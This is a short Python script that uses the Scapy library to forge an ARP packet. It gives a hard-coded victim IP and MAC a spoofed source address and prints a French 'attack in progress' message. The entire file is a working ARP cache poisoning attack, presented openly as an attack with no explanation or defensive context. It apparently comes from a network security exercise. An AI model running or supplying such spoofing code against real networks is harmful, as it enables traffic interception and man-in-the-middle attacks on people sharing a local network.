from scapy.all import *

victim_ip = "10.33.73.72" 
victim_mac = "30:89:4A:D2:5A:AA"  

spoofed_ip = "10.13.33.37"  
spoofed_mac = "de:ad:be:ef:ca:fe"

def arp_poison(victim_ip, victim_mac, spoofed_ip, spoofed_mac):

    arp = ARP(op="who-has", pdst=victim_ip, hwdst=victim_mac, psrc=spoofed_ip, hwsrc=spoofed_mac) 
    print(f"Attaque en cours sur {victim_ip}...")
    send(arp, verbose=False)  

arp_poison(victim_ip, victim_mac, spoofed_ip, spoofed_mac)